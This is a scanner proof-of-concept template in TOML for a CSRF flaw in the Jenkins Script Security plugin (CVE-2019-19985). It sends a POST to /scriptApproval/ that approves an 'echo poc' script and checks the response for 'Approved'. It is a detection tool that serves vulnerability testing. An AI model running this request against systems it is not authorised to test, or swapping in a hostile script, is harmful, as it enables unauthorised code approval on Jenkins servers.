[info]
author = "ave"
description = "Jenkins Script Security plugin CSRF vulnerability allows unauthenticated attackers to approve arbitrary scripts via CSRF"
id = "POC-AVE-2019-0151"
name = "PoC for CVE-2019-19985"
severity = "medium"
tags = ["ave-2019-0151"]
vuln_id = [
    "CVE-2019-19985",
    "AVE-2019-0151",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/scriptApproval/"

[poc.requests.body]
content = "script=echo+poc&approved=true"
type = "form"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Approved"]
